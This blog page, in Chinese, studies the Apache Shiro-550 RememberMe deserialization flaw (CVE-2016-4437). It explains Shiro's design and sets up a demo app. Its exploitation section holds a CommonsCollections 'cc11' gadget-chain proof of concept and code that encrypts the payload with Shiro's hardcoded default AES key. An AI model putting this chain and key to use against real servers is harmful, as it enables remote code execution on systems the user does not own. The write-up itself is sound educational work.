<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Shiro 550漏洞学习 | Reus09&#39;s Blog</title>
<meta name="keywords" content="反序列化漏洞">
<meta name="description" content="前言 之前参加过护网的面试，总喜欢问shiro-550漏洞的原理和利用方式，再加上现在在进行JAVA安全的学习，Shiro作为Java开发中一">
<meta name="author" content="Reus09">
<link rel="canonical" href="/posts/tech/shiro-550%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Shiro 550漏洞学习" />
<meta property="og:description" content="前言 之前参加过护网的面试，总喜欢问shiro-550漏洞的原理和利用方式，再加上现在在进行JAVA安全的学习，Shiro作为Java开发中一" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/tech/shiro-550%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-03-19T14:04:48+08:00" />
<meta property="article:modified_time" content="2023-03-19T14:04:48+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Shiro 550漏洞学习"/>
<meta name="twitter:description" content="前言 之前参加过护网的面试，总喜欢问shiro-550漏洞的原理和利用方式，再加上现在在进行JAVA安全的学习，Shiro作为Java开发中一"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "📚文章",
      "item": "/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "👨🏻‍💻技术",
      "item": "/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "Shiro 550漏洞学习",
      "item": "/posts/tech/shiro-550%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Shiro 550漏洞学习",
  "name": "Shiro 550漏洞学习",
  "description": "前言 之前参加过护网的面试，总喜欢问shiro-550漏洞的原理和利用方式，再加上现在在进行JAVA安全的学习，Shiro作为Java开发中一",
  "keywords": [
    "反序列化漏洞"
  ],
  "articleBody": "前言 之前参加过护网的面试，总喜欢问shiro-550漏洞的原理和利用方式，再加上现在在进行JAVA安全的学习，Shiro作为Java开发中一个很重要的Java安全框架，这里也就跟进学习一下shiro存在的一些历史漏洞。\n根据官方网站上的漏洞通报，Shiro 在历史上共通报了 11 个 CVE，除了 SHIRO-550 和SHIRO-721的反序列化以及 CVE-2014-0074 的 ldap 绕过之外，其他的绕过都是在路径处理过程中产生问题导致的绕过。\n这些绕过多数是由于 shiro 的处理逻辑有误，或和中间件、其他框架的处理逻辑不一致导致的安全问题，通常会依赖场景。\n这里就先对最简单的shrio-550以契子进行学习,同时简单学习一下Shiro具体是什么东西。\nShiro简单介绍 Shiro主要实现功能 Apache Shiro 是一个 Java 安全框架，包括如下功能和特性：\nAuthentication：身份认证/登陆，验证用户是不是拥有相应的身份。在 Shiro 中，所有的操作都是基于当前正在执行的用户，这里称之为一个 Subject，在用户任意代码位置都可以轻易取到这个Subject。Shiro 支持数据源，称之为 Realms，可以利用其连接 LDAP\\AD\\JDBC 等安全数据源，并支持使用自定义的 Realms，并可以同时使用一个或多个 Realms 对一个用户进行认证，认证过程可以使用配置文件配置，无需修改代码。同时，Shiro 还支持 RememberMe，记住后下次访问就无需登录。 Authorization：授权，即权限验证，验证某个已认证的用户是否拥有某个权限。同样基于 Subject、支持多种 Realms。Shiro 支持 Wildcard Permissions ，也就是使用通配符来对权限验证进行建模，使权限配置简单易读。Shiro 支持基于 Roles 和基于 Permissions 两种方式的验证，可以根据需要进行使用。并且支持缓存产品的使用。 Session Manager：会话管理，用户登陆后就是一次会话，在没有退出之前，它的所有信息都在会话中。Shiro 中的一切（包括会话和会话管理的所有方面）都是基于接口的，并使用 POJO 实现，因此可以使用任何与 JavaBeans 兼容的配置格式（如 JSON、YAML、Spring XML 或类似机制）轻松配置所有会话组件。Session 支持缓存集群的方式；还支持事件侦听器，允许在会话的生命周期内侦听生命周期事件，以执行相关逻辑。Shiro Sessions 保留发起会话的主机的 IP 地址，因此可以根据用户位置来执行不同逻辑。Shiro 对 Web 支持实现了 HttpSession 类及相关全部 API。也可以在 SSO 中使用。 Cryptography：加密，保护数据的安全性；Shiro 专注于使用公私钥对数据进行加密，以及对密码等数据进行不可逆的哈希。 Permissions：用户权限；Shiro 将所有的操作都抽象为 Permission，并默认使用 Wildcard Permissions 来进行匹配。Shiro 支持实例级别的权限控制校验，例如domain:action:instance。 Caching：缓存，为了提高 Shiro 在业务中的性能表现。Shiro 的缓存支持基本上是一个封装的 API，由用户自行选择底层的缓存方式。缓存中有三个重要的接口 CacheManager/Cache/CacheManagerAware ，Shiro 提供了默认的 MemoryConstrainedCacheManager 等实现。 shiro主要的类 Shiro 架构中主要有三个核心的概念：Subject, SecurityManager, Realms。\nSubject：代表当前的用户\nSecurityManager：管理者所有的 Subject ，在官方文档中描述其为 Shiro 架构的核心\nRealms：SecurityManager的认证和授权需要使用Realm，Realm负责获取用户的权限和角色等信息，再返回给SecurityManager来进行判断，在配置 Shiro 的时候，我们必须指定至少一个Realm 来实现认证（authentication）和/或授权（authorization）\n对于Shiro来说，一次认证及授权的校验流程：\n应用程序通过获取当前访问的 Subject（也就是用户），并调用其相应校验方法； Subject 将校验委托给 SecurityManager 进行判断； SecurityManager 会调用 Realm 来获取信息来判断用户对应的角色能否进行操作。 SecurityManager org.apache.shiro.mgt.SecurityManager 是 shiro 的一个核心接口，接口负责了一个 Subject 也就是“用户”的全部安全操作：\n接口本身定义了 createSubject、login、logout 三个方法用来创建 Subject、登陆和退出。 扩展了 org.apache.shiro.authc.Authenticator 接口，提供了 authenticate 方法用来进行认证。 扩展了 org.apache.shiro.authz.Authorizer 接口，提供了对 Permission 和 Role 的校验方法。包括 has/is/check 相关命名的方法。 扩展了 org.apache.shiro.session.mgt.SessionManager 接口，提供了 start、getSession 方法用来创建可获取会话。 Shiro 为 SecurityManager 提供了一个包含了上述所有功能的默认实现类 org.apache.shiro.mgt.DefaultSecurityManager，中间继承了很多中间类，并逐层实现了相关的方法，继承关系如下图。\nDefaultSecurityManager 还有一个子类，就是 org.apache.shiro.web.mgt.DefaultWebSecurityManager，这个类在 shiro-web 包中，是 Shiro 为 HTTP/SOAP 等 http 协议连接提供的实现类，这个类默认创建配置了 org.apache.shiro.web.mgt.CookieRememberMeManager 用来提供 RememberMe 相关功能。\n我们如果使用spring或者springboot等框架进行整合Shiro的时候，在设定SecurityManager对应的Realm时，需要声明使用的类为:DefaultWebSecurityManager。\nSubject org.apache.shiro.subject.Subject 是一个接口，用来表示在 Shiro 中的一个用户。因为在太多组件中都使用了 User 的概念，所以 Shiro 故意避开了这个关键字，使用了 Subject。\nSubject 接口同样提供了认证（login/logout）、授权（访问控制 has/is/check 方法）以及获取会话的能力。在应用程序中如果想要获取一个当前的 Subject，通常使用 SecurityUtils.getSubject() 方法即可。\n实际上，Subject 接口在 core 包中的实现类 org.apache.shiro.subject.support.DelegatingSubject 本质上也就是一个 SecurityManager 的代理类。\nDelegatingSubject 中保存了一个 transient 修饰的 SecurityManager 成员变量，在使用具体的校验方法时，实际上委托 SecurityManager 进行处理，如下图：\nDelegatingSubject 中不会保存和维持一个用户的“状态（角色/权限）”，恰恰相反，每次它都依赖于底层的实现组件 SecurityManager 进行检查和校验，因此通常会要求 SecurityManager 的实现类来提供一些缓存机制。\nRealm org.apache.shiro.realm.Realm 是 Shiro 中的一个接口，Shiro 通过 Realm 来访问指定应用的安全实体——用户、角色、权限等。一个 Realm 通常与一个数据源有 1 对 1 的对应关系，如关系型数据库、文件系统或者其他类似的资源。\n实际上，一个Subject查询是否权限、角色的时候，是交付给底层的SecurityManager，而SecurityManager是通过其设定的Realm中定义的规则、权限来实现授权、认证的。\n在使用中，开发人员通常不会直接实现 Realm 接口，而是实现 Shiro 提供了一些相关功能的抽象类 AuthenticatingRealm/AuthorizingRealm，或者使用针对特定数据源提供的实现类如 JndiLdapRealm/JdbcRealm/PropertiesRealm/TextConfigurationRealm/IniRealm 等等。继承关系大概如下：\n较多情况下，开发人员会自行实现 AuthorizingRealm 类，并重写 doGetAuthorizationInfo/doGetAuthenticationInfo 方法来自行实现自身的认证和授权逻辑。\nShiro简单使用 为了简化操作的流程，我们这里直接使用springboot进行整合Shiro。\n通过maven导入相关依赖：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 org.apache.shiro shiro-web 1.6.0 org.apache.shiro shiro-core 1.2.4 org.apache.shiro shiro-spring 1.4.0 然后定义我们自己的授权、认证的Realm。\n认证的用户账户名为reus09,密码为password。 并且其拥有两个Role:admin,user。 admin拥有add权限，user拥有delete权限。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 public class MyShiroRealm extends AuthorizingRealm { /** * 模拟数据库数据 */ Map userMap = new HashMap\u003c\u003e(16); { userMap.put(\"reus09\", \"123456\"); super.setName(\"myShiroRealm\"); // 设置自定义Realm的名称，取什么无所谓.. } /** * 授权 * @param principalCollection * @return */ @Override protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) { String userName = (String) principalCollection.getPrimaryPrincipal(); Set roles = getRolesByUserName(userName); Set permissions = getPermissionsByUserName(userName); SimpleAuthorizationInfo simpleAuthorizationInfo = new SimpleAuthorizationInfo(); simpleAuthorizationInfo.setRoles(roles); simpleAuthorizationInfo.setStringPermissions(permissions); return simpleAuthorizationInfo; } /** * 模拟从数据库中获取权限数据 * * @param userName * @return */ private Set getPermissionsByUserName(String userName) { Set permissions = new HashSet\u003c\u003e(); permissions.add(\"user:delete\"); permissions.add(\"admin:add\"); return permissions; } /** * 模拟从数据库中获取角色数据 * * @param userName * @return */ private Set getRolesByUserName(String userName) { Set roles = new HashSet\u003c\u003e(); roles.add(\"admin\"); roles.add(\"user\"); return roles; } @Override protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authenticationToken) throws AuthenticationException { String username = (String) authenticationToken.getPrincipal(); String password = getPasswordByUsername(username); if(password == null){ return null; }else{ return new SimpleAuthenticationInfo(username,password,\"myShiroRealm\"); } } public String getPasswordByUsername(String username){ return userMap.get(username); } } 同时我们来定义login,index,logout三个路由来作为我们测试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 @Controller public class HelloController { @RequestMapping(\"/index\") @ResponseBody public String index(){ return \"hello , this is demo\"; } @ResponseBody @RequestMapping(\"/login\") public String login(String username , String password){ Subject subject = SecurityUtils.getSubject(); UsernamePasswordToken usernamePasswordToken = new UsernamePasswordToken(username, password); try { subject.login(usernamePasswordToken); return \"hello, this is demo\"; } catch (Exception ex){ return \"sorry, 你还没有登录\"; } } @ResponseBody @RequestMapping(\"/403\") public String unAuthorized(){ return \"403 no Authorized\"; } @RequestMapping(\"/logout\") public String logout(){ return \"forward:/login\"; } } 在 Servlet 项目中，是通过在 web.xml 中配置了能匹配所有 URL 路径 /* 的 ShiroFilter，并由其执行后续逻辑。而在 Spring 生态下，由于 IoC 与 DI 的思想，通常把所有的 Filter 注册成为 Bean 交给 Spring 来管理。\n此时如果想要将 Shiro 逻辑注入其中，就用到了关键类：ShiroFilterFactoryBean。这是 Shiro 为 Spring 生态提供的工厂类，由它在 spring 中承担了之前 ShiroFilter 的角色。\n因此来配置我们的shiro Filter来实现用户认证过程。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 @Configuration public class ShiroConfig { @Bean public ShiroFilterFactoryBean shiroFilter(SecurityManager securityManager){ ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean(); shiroFilterFactoryBean.setSecurityManager((SecurityManager) securityManager); // 拦截器 Map filterChainDefinitionMap = new LinkedHashMap\u003c\u003e(); // filterChainDefinitionMap.put(\"/static/**\",\"anno\"); filterChainDefinitionMap.put(\"/logout\",\"logout\"); filterChainDefinitionMap.put(\"/**\",\"authc\"); shiroFilterFactoryBean.setLoginUrl(\"/login\"); shiroFilterFactoryBean.setSuccessUrl(\"/index\"); shiroFilterFactoryBean.setUnauthorizedUrl(\"/403\"); shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap); return shiroFilterFactoryBean; } @Bean public MyShiroRealm myShiroRealm(){ return new MyShiroRealm(); } @Bean public SecurityManager securityManager(){ DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager(); securityManager.setRealm(myShiroRealm()); return securityManager; } } 没有进行认证前。\n认证后：\nlogout，退出登录之后，会注销掉我们的权限和认证的用户，再次访问/index，会重定向到/login路径。\nShiro-550漏洞分析 漏洞信息 漏洞信息 详情 漏洞编号 CVE-2016-4437 / CNVD-2016-03869 / SHIRO-550 影响版本 shiro 1.x \u003c 1.2.5 漏洞描述 如果程序未能正确配置 “remember me” 功能使用的密钥。 攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。 漏洞关键字 cookie | RememberMe | 反序列化 | 硬编码 | AES 漏洞补丁 Commit-4d5bb00 相关链接 SHIRO-441 https://www.anquanke.com/post/id/192619 漏洞详解 Shiro 从 0.9 版本开始设计了 RememberMe 的功能，用来提供在应用中记住用户登陆状态的功能。\nRememberMeManager 首先是接口 org.apache.shiro.mgt.RememberMeManager，这个接口提供了 5 个方法：\ngetRememberedPrincipals：在指定上下文中找到记住的 principals，也就是 RememberMe 的功能。 forgetIdentity：忘记身份标识。 onSuccessfulLogin：在登陆校验成功后调用，登陆成功时，保存对应的 principals 供程序未来进行访问。 onFailedLogin：在登陆失败后调用，登陆失败时，在程序中“忘记”该 Subject 对应的 principals。 onLogout: 在用户退出时调用，当一个 Subject 注销时，在程序中“忘记”该 Subject 对应的 principals。 AbstractRememberMeManager 同时，Shiro 还提供了一个实现了 RememberMeManager 接口的抽象类 AbstractRememberMeManager，提供了一些实现技术细节。先介绍其中重要的几个成员变量：\nDEFAULT_CIPHER_KEY_BYTES：一个 Base64 的硬编码的 AES Key，也是本次漏洞的关键点，这个 key 会被同时设置为加解密 key 成员变量：encryptionCipherKey/decryptionCipherKey 。 serializer：Shiro 提供的序列化器，用来对序列化和反序列化标识用户身份的 PrincipalCollection 对象。 cipherService：用来对数据加解密的类，实际上是 org.apache.shiro.crypto.AesCipherService 类，这是一个对称加密的实现，所以加解密的 key 是使用了同一个。 在其初始化时，会创建 DefaultSerializer 作为序列化器，AesCipherService 作为加解密实现类，DEFAULT_CIPHER_KEY_BYTES 作为加解密的 key。\nCookieRememberMeManager 在 shiro-web 包中提供了具体的实现类 CookieRememberMeManager，实现了在 HTTP 无状态协议中使用 cookie 记录用户信息的相关能力。其中一个比较重要的方法是 getRememberedSerializedIdentity，具体逻辑如下图：\n简单来说就是实现了，读取Cookie的值，然后base64解密并返回字节数组。\n漏洞分析 在 Filter 处理流程中，无论是 ShiroFilter 还是 IniShiroFilter， doFilter 方法都是继承至 AbstractShiroFilter，会调用 AbstractShiroFilter#doFilterInternal 方法，使用保存的 SecurityManager 创建 Subject 对象。具体调用流程大概如下：\n创建 Subject 对象后，会试图从利用当前的上下文中的信息来解析当前用户的身份，将会调用 DefaultSecurityManager#resolvePrincipals 方法，继续调用 AbstractRememberMeManager#getRememberedPrincipals 方法，如下图：\n然后调用org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity方法来将Cookie进行base64解密。\n然后调用org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals方法，里面关注decrypt方法和deserialize方法。\ndecrypt方法是AesCipherService 进行解密。\n在 Shiro 中，序列化器的默认实现是 DefaultSerializer，可以看到其 deserialize 方法使用 Java 原生反序列化，使用 ByteArrayInputStream 将 byte 转为 ObjectInputStream ，并调用 readObject 方法执行反序列化操作。\n以上就是 Shiro 创建 Subject 时执行的逻辑，跟下来后就看到了完整的漏洞触发链：\n攻击者构造恶意的反序列化数据，使用硬编码的 AES 加密，然后 Base64 编码放在 Cookie 中，即可触发漏洞利用。\n漏洞利用 这里我们利用 cc11 来加载我们的恶意代码来打过去，cc11 的好处在于可以直接加载字节码，例如 cc6 和 cc11的区别就是一个是命令执行一个是代码执行，相比之下肯定是我们的代码执行危害比较大\nShiro 使用 ClassResolvingObjectInputStream 执行反序列化的操作，这个类重写了 resolveClass ，实际使用 ClassLoader.loadClass() 方式而非 ObjectInputStream 中的 Class.forName() 的方式。而 forName 的方式可以加载任意的数组类型，loadClass 只能加载原生的类型的 Object Array。\n在代码审计知识星球中的《Java安全漫谈 - 15.TemplatesImpl在Shiro中的利用.pdf》 及 《Shiro-1-2-4-RememberMe反序列化漏洞分析-CVE-2016-4437.pdf》两篇文章中针对此问题进行了讨论和调试。\ncc11 的 Poc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class CC11 { public static void setFieldValue(Object obj, String fileNmae, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fileNmae); field.setAccessible(true); field.set(obj,value); } public static void main(String[] args) throws Exception { // 构造恶意 TemplatesImpl 对象 TemplatesImpl obj = new TemplatesImpl(); // 获取恶意类的字节码 byte[] code = Files.readAllBytes(Paths.get(\"/Users/reus09/Desktop/JavaSec/Deserializer/target/classes/CC11/EvilClass.class\")); byte[][] codes = {code}; // 反射修改属性 setFieldValue(obj, \"_bytecodes\", new byte[][] {code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); // ================ // 利用 InvokerTransformer 调用 TemplatesImpl.newTransformer InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\", null, null); // 假的链子 Transformer fakeTransformer = new ConstantTransformer(1); //=============== Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, fakeTransformer); TiedMapEntry tme = new TiedMapEntry(outerMap, obj); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\"); innerMap.remove(obj); setFieldValue(outerMap, \"factory\", invokerTransformer); // ============== // 生成序列化字符串 ObjectOutputStream oss = new ObjectOutputStream(new FileOutputStream(\"./cc11.bin\")); oss.writeObject(expMap); oss.close(); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"./cc11.bin\")); Object o = (Object) ois.readObject(); } } 运行 cc11 的 poc 生成对应文件，然后利用如下代码进行加密生成\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public static byte[] getBytes(String path) throws Exception{ InputStream inputStream = new FileInputStream(path); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int n = 0; while ((n=inputStream.read())!=-1){ byteArrayOutputStream.write(n); } byte[] bytes = byteArrayOutputStream.toByteArray(); return bytes; } public static void main(String[] args) throws Exception{ String path = \"/Users/reus09/Desktop/JavaSec/cc11.bin\"; byte[] key = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); AesCipherService aes = new AesCipherService(); ByteSource ciphertext = aes.encrypt(getBytes(path), key); System.out.printf(ciphertext.toString()); } } 攻击： 漏洞疑惑 这里讲一下为什么Cookie的key要为rememberMe。\n在调用调用org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity方法的时候。\nCookieRememberMeManager的构造函数会初始化一个类SimpleCookie，来存储我们传输的Cookie的key和value。\n根据SimpleCookie的构造函数，我们可以看到rememberMe作为字符串传入，作为cookie的name。\n然后在org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity方法中使用org.apache.shiro.web.servlet.SimpleCookie#readValue方法来根据初始化传入的name:rememberMe读取request请求中的cookie，如果不为空，就将其cookie对应的value返回。\n接下来就是我们的base64解密过程，就不在赘述。\n",
  "wordCount" : "6300",
  "inLanguage": "en",
  "datePublished": "2023-03-19T14:04:48+08:00",
  "dateModified": "2023-03-19T14:04:48+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/tech/shiro-550%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="">Home</a>&nbsp;»&nbsp;<a href="/posts/">📚文章</a>&nbsp;»&nbsp;<a href="/posts/tech/">👨🏻‍💻技术</a></div>
    <h1 class="post-title">
      Shiro 550漏洞学习
    </h1>
    <div class="post-meta"><span title='2023-03-19 14:04:48 +0800 +0800'>2023-03-19</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e5%89%8d%e8%a8%80" aria-label="前言">前言</a></li>
                    <li>
                        <a href="#shiro%e7%ae%80%e5%8d%95%e4%bb%8b%e7%bb%8d" aria-label="Shiro简单介绍">Shiro简单介绍</a><ul>
                            
                    <li>
                        <a href="#shiro%e4%b8%bb%e8%a6%81%e5%ae%9e%e7%8e%b0%e5%8a%9f%e8%83%bd" aria-label="Shiro主要实现功能">Shiro主要实现功能</a></li>
                    <li>
                        <a href="#shiro%e4%b8%bb%e8%a6%81%e7%9a%84%e7%b1%bb" aria-label="shiro主要的类">shiro主要的类</a><ul>
                            
                    <li>
                        <a href="#securitymanager" aria-label="SecurityManager">SecurityManager</a></li>
                    <li>
                        <a href="#subject" aria-label="Subject">Subject</a></li>
                    <li>
                        <a href="#realm" aria-label="Realm">Realm</a></li></ul>
                    </li>
                    <li>
                        <a href="#shiro%e7%ae%80%e5%8d%95%e4%bd%bf%e7%94%a8" aria-label="Shiro简单使用">Shiro简单使用</a></li></ul>
                    </li>
                    <li>
                        <a href="#shiro-550%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="Shiro-550漏洞分析">Shiro-550漏洞分析</a><ul>
                            
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%a1%e6%81%af" aria-label="漏洞信息">漏洞信息</a></li>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e8%af%a6%e8%a7%a3" aria-label="漏洞详解">漏洞详解</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#remembermemanager" aria-label="RememberMeManager">RememberMeManager</a></li>
                    <li>
                        <a href="#abstractremembermemanager" aria-label="AbstractRememberMeManager">AbstractRememberMeManager</a></li>
                    <li>
                        <a href="#cookieremembermemanager" aria-label="CookieRememberMeManager">CookieRememberMeManager</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="漏洞分析">漏洞分析</a></li>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" aria-label="漏洞利用">漏洞利用</a></li>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e7%96%91%e6%83%91" aria-label="漏洞疑惑">漏洞疑惑</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

